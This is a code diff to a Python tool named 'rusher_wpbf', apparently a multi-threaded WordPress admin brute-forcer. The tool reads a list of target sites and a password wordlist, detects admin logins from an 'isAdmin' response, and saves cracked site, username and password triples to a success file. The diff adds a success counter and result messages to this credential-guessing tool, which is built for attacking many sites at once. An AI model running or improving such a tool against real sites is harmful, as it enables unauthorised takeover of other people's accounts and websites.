@@ -67,6 +67,7 @@ class rusher_wpbf:
             if "<name>isAdmin</name>" in x.text:
 
                 open("result-wp/success.txt", "a").write("{}/wp-login.php|{}|{}\n".format(target, user, passwd))
+                self.result += 1
 
             self.done_process += 1
             self.count_percent()            
@@ -84,7 +85,7 @@ class rusher_wpbf:
                 self.done_process += 1
                 self.count_percent()
 
-        sys.stdout.write("\r[*] [Proccess] [ {}/{} | {}% ]".format(self.done_process, self.total_process, round(self.percent)))
+        sys.stdout.write("\r[*] [Proccess] [{}/{} | {}%] [Result: {}/{}]".format(self.done_process, self.total_process, round(self.percent), self.result, self.target))
         sys.stdout.flush()
 
     def execution(self, target, thread):
@@ -113,6 +114,7 @@ class rusher_wpbf:
         self.done_process = 0
         self.try_login = 0
         self.total_process = 0
+        self.result = 0
         parser = ArgumentParser()
         parser.add_argument("-x", "--target", required=True)
         parser.add_argument("-w", "--wordlist", required=True)
@@ -125,14 +127,13 @@ class rusher_wpbf:
             if os.path.isfile(self.args.wordlist):
 
                 print("[*] [Bruteforcing]")
+                self.target = len(open(self.args.target).read().splitlines())
 
                 with concurrent.futures.ThreadPoolExecutor(max_workers=self.args.thread) as executor:
 
-                    for target in open(self.args.target, errors="ignore").read().split("\n"):
+                    for target in open(self.args.target, errors="ignore").read().splitlines():
 
-                        if target != '':
-
-                            executor.submit(self.execution, target, self.args.thread)
+                        executor.submit(self.execution, target, self.args.thread)
 
             else:
 
@@ -143,6 +144,7 @@ class rusher_wpbf:
             if os.path.isfile(self.args.wordlist):
 
                 print("[*] [Bruteforcing]")
+                self.target = 1
                 self.execution(self.args.target, self.args.thread)
 
             else:
@@ -150,6 +152,14 @@ class rusher_wpbf:
                 print("[-] [Error] -> ( Not found {} )".format(self.args.wordlist))
 
         print("\n[*] [Done]")
+
+        if self.result > 0:
+
+            print("[+] [Result: result-wp/success.txt]")
+
+        else:
+
+            print("[-] [No Result]")
 
 if __name__ == "__main__":
     
